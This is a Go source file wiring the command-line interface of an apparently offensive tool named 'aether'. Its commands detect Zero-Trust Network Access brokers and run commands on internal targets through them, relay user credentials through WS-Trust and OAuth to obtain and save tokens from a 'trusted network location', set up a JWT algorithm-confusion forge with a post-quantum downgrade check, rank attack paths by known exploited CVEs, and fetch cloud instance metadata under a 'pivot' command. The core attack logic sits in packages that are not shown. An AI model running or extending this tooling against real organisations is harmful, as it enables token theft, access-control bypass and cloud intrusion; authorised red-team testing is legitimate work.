package cli

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/spf13/cobra"

	"github.com/Debajyoti0-0/aether/internal/engine/exec"
	"github.com/Debajyoti0-0/aether/internal/engine/graph"
	"github.com/Debajyoti0-0/aether/internal/engine/relay"
	"github.com/Debajyoti0-0/aether/internal/intel"
	"github.com/Debajyoti0-0/aether/internal/protocol/oauth2"
	"github.com/Debajyoti0-0/aether/internal/protocol/wstrust"
	"github.com/Debajyoti0-0/aether/internal/transport"
)

func transportClientForPreset(preset string) (*http.Client, error) {
	return transport.NewClient(preset, 30*time.Second)
}

// ---------------------------------------------------------------- ztna

var ztnaCmd = &cobra.Command{
	Use:   "ztna",
	Short: "ZTNA broker detection & broker-routed execution",
	Long: `Detect Zero-Trust Network Access gateways (Zscaler, Cloudflare,
Netskope) in the network path and route authentication/execution
through them. Aether doesn't break ZPA — it rides the IdP trust
relationship: tokens issued through the broker's egress originate
from the trusted network location.`,
}

var ztnaDetectCmd = &cobra.Command{
	Use:   "detect",
	Short: "Detect the ZTNA broker in the network path",
	RunE: func(cmd *cobra.Command, args []string) error {
		hc, err := transportClientFor(ztnaPreset)
		if err != nil {
			return err
		}
		broker, err := exec.DetectBroker(context.Background(), hc)
		if err != nil {
			return err
		}
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		return enc.Encode(broker)
	},
}

var ztnaExecCmd = &cobra.Command{
	Use:   "exec",
	Short: "Execute against an internal target via the broker route",
	RunE: func(cmd *cobra.Command, args []string) error {
		hc, err := transportClientFor(ztnaPreset)
		if err != nil {
			return err
		}
		broker, err := exec.DetectBroker(context.Background(), hc)
		if err != nil {
			return err
		}

		routed, err := exec.RouteThroughBroker(context.Background(), broker, ztnaPreset, ztnaTimeout)
		if err != nil {
			return err
		}

		res, err := exec.ExecThroughZTNA(context.Background(), routed, ztnaTarget, ztnaCmdStr)
		if err != nil {
			return err
		}
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		return enc.Encode(res)
	},
}

var (
	ztnaPreset  string
	ztnaTarget  string
	ztnaCmdStr  string
	ztnaTimeout time.Duration
)

func transportClientFor(preset string) (*http.Client, error) {
	return httpClientFor(preset)
}

// httpClientFor builds the uTLS client (indirection for testability).
var httpClientFor = func(preset string) (*http.Client, error) {
	return transportClientForPreset(preset)
}

func init() {
	rootCmd.AddCommand(ztnaCmd)
	ztnaCmd.AddCommand(ztnaDetectCmd, ztnaExecCmd)

	ztnaCmd.PersistentFlags().StringVar(&ztnaPreset, "browser-preset", "chrome", "TLS fingerprint preset")
	ztnaExecCmd.Flags().StringVar(&ztnaTarget, "target", "", "Internal target URL (required)")
	ztnaExecCmd.Flags().StringVar(&ztnaCmdStr, "cmd", "", "Command to hand to the handler (required)")
	ztnaExecCmd.Flags().DurationVar(&ztnaTimeout, "timeout", 30*time.Second, "Timeout")
	_ = ztnaExecCmd.MarkFlagRequired("target")
	_ = ztnaExecCmd.MarkFlagRequired("cmd")
}

// ---------------------------------------------------------------- relay --ztna

var relayZTNACmd = &cobra.Command{
	Use:   "ztna",
	Short: "Route the auth relay through the detected ZTNA broker",
	RunE: func(cmd *cobra.Command, args []string) error {
		hc, err := transportClientFor(ztnaPreset)
		if err != nil {
			return err
		}
		broker, err := exec.DetectBroker(context.Background(), hc)
		if err != nil {
			return err
		}
		fmt.Fprintf(os.Stderr, "[ztna] broker %s via %s\n", broker.Type, broker.Proxy)

		routed, err := exec.RouteThroughBroker(context.Background(), broker, ztnaPreset, 30*time.Second)
		if err != nil {
			return err
		}

		// Run the MFA relay through the broker-routed client: the token
		// issuance egresses from the trusted network location.
		password := relayZPassword
		if password == "" {
			password = os.Getenv("AETHER_PASSWORD")
		}
		if password == "" {
			return fmt.Errorf("password required via --password or AETHER_PASSWORD")
		}

		sts, err := wstrust.NewClient(relaySTSEndpt, ztnaPreset, 30*time.Second)
		if err != nil {
			return err
		}
		sts.HTTPClient = routed

		oauth, err := oauth2.NewClient(ztnaPreset, 30*time.Second)
		if err != nil {
			return err
		}
		oauth.HTTPClient = routed

		relay := &relay.WSTrustRelay{STS: sts, OAuth: oauth, Tenant: relayZTenant, ClientID: relayZClientID}
		result, err := relay.Relay(context.Background(), relayZUser, password, relayZAppliesTo)
		if err != nil {
			return err
		}
		if err := saveTokens(result.Tokens, relayOutput); err != nil {
			return err
		}
		return printTokens(result.Tokens)
	},
}

var (
	relayZUser      string
	relayZPassword  string
	relayZTenant    string
	relayZClientID  string
	relayZAppliesTo string
)

// ---------------------------------------------------------------- token confuse --downgrade-pqc

var confuseDowngradePQC bool
var confuseJWKSURL string

func init() {
	tokenConfuseCmd.Flags().BoolVar(&confuseDowngradePQC, "downgrade-pqc", false, "Detect PQC algs in JWKS and pick the classic fallback")
	tokenConfuseCmd.Flags().StringVar(&confuseJWKSURL, "jwks-url", "", "Issuer jwks_uri to fetch and analyze")
}

// pqcCheck runs before the confusion forge when --downgrade-pqc is set.
func pqcCheck(ctx context.Context) error {
	if !confuseDowngradePQC {
		return nil
	}
	if confuseJWKSURL == "" {
		return fmt.Errorf("--downgrade-pqc requires --jwks-url")
	}
	jwks, err := oauth2.FetchJWKS(ctx, nil, confuseJWKSURL)
	if err != nil {
		return err
	}
	d, err := oauth2.DetectAndDowngrade(jwks)
	if err != nil {
		return err
	}
	out := map[string]any{
		"pqc_detected":     d.PQCDetected,
		"pqc_algs":         d.PQCAlgs,
		"downgrade_alg":    d.DowngradeAlg,
		"fallback_viable":  d.FallbackViable,
	}
	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	if err := enc.Encode(out); err != nil {
		return err
	}
	if d.DowngradeAlg == "HS256" && d.RSAPubKey != nil {
		// The confusion forge already signs with HS256; print the
		// decision context and continue.
		fmt.Fprintf(os.Stderr, "[pqc] downgrade to %s viable — continuing with alg-confusion forge\n", d.DowngradeAlg)
		return nil
	}
	fmt.Fprintf(os.Stderr, "[pqc] no HS256 path (no RSA key in JWKS); RS256 classic fallback only\n")
	return nil
}

// ---------------------------------------------------------------- export attck / run --prioritize

var runPrioritize bool

// intelPrioritizeCmd — CISA KEV-aware path prioritization.
var intelPrioritizeCmd = &cobra.Command{
	Use:   "prioritize",
	Short: "Prioritize attack paths by CISA KEV exposure (+30% boost)",
	RunE: func(cmd *cobra.Command, args []string) error {
		g, err := graph.LoadGraph(prioGraph)
		if err != nil {
			return err
		}
		engine := graph.NewGraphEngine(g, prioMaxRisk)

		// Discover cross-provider paths (the highest-value set).
		chains, err := engine.SynthesizeChains(1, prioMax)
		if err != nil {
			return err
		}

		var paths [][]string
		for _, c := range chains {
			paths = append(paths, c.Path)
		}

		var kev *intel.Catalog
		if prioKEVFile != "" {
			kev, err = intel.LoadKEVFromFile(prioKEVFile)
			if err != nil {
				return err
			}
		} else if prioKEVURL != "" {
			kev, err = intel.LoadKEVFromURL(context.Background(), nil, prioKEVURL)
			if err != nil {
				return err
			}
		}

		// Path → CVE mapping comes from the optional mapping JSON.
		var cvesByPath map[string][]string
		if prioCVEMap != "" {
			data, err := os.ReadFile(prioCVEMap)
			if err != nil {
				return err
			}
			if err := json.Unmarshal(data, &cvesByPath); err != nil {
				return err
			}
		}

		prioritized := intel.Prioritize(paths, cvesByPath, kev)
		fmt.Print(intel.RenderPrioritized(prioritized))
		return nil
	},
}

var (
	prioGraph   string
	prioMax     int
	prioMaxRisk int
	prioKEVFile string
	prioKEVURL  string
	prioCVEMap  string
)

// ---------------------------------------------------------------- imds v2 verification

var imdsVerifyCmd = &cobra.Command{
	Use:   "verify-imds",
	Short: "Verify the full IMDS v2 two-step handshake (PUT token → GET identity)",
	RunE: func(cmd *cobra.Command, args []string) error {
		client := exec.NewIMDSClient(nil)
		if err := client.FetchToken(context.Background(), 300); err != nil {
			return fmt.Errorf("IMDSv2 token (PUT) failed: %w", err)
		}
		fmt.Println("[OK] IMDSv2 PUT token acquired (Metadata-Token)")
		if _, err := client.InstanceMetadata(context.Background()); err != nil {
			return fmt.Errorf("IMDSv2 GET instance metadata failed: %w", err)
		}
		fmt.Println("[OK] IMDSv2 GET instance metadata succeeded — two-step handshake verified")
		return nil
	},
}

func init() {
	exportCmd.AddCommand(intelPrioritizeCmd)
	intelPrioritizeCmd.Flags().StringVar(&prioGraph, "graph", "", "Graph JSON file (required)")
	intelPrioritizeCmd.Flags().IntVar(&prioMax, "max-paths", 10, "Max paths to consider")
	intelPrioritizeCmd.Flags().IntVar(&prioMaxRisk, "risk-threshold", 60, "Risk ceiling")
	intelPrioritizeCmd.Flags().StringVar(&prioKEVFile, "kev-file", "", "Local CISA KEV catalog JSON")
	intelPrioritizeCmd.Flags().StringVar(&prioKEVURL, "kev-url", "", "Live CISA KEV feed URL")
	intelPrioritizeCmd.Flags().StringVar(&prioCVEMap, "cve-map", "", "JSON mapping path-key → CVEs (required for KEV boost)")
	_ = intelPrioritizeCmd.MarkFlagRequired("graph")

	pivotCmd.AddCommand(imdsVerifyCmd)

	relayZTNACmd.Flags().StringVar(&relayZUser, "username", "", "Username (required)")
	relayZTNACmd.Flags().StringVar(&relayZPassword, "password", "", "Password (or AETHER_PASSWORD env)")
	relayZTNACmd.Flags().StringVar(&relayZTenant, "tenant", "", "Tenant id (required)")
	relayZTNACmd.Flags().StringVar(&relayZClientID, "client-id", "1950a258-227b-4e31-a9cf-717495945fc2", "Public client id")
	relayZTNACmd.Flags().StringVar(&relayZAppliesTo, "applies-to", "urn:federation:MicrosoftOnline", "AppliesTo realm")
	_ = relayZTNACmd.MarkFlagRequired("username")
	_ = relayZTNACmd.MarkFlagRequired("tenant")
	relayCmd.AddCommand(relayZTNACmd)
}
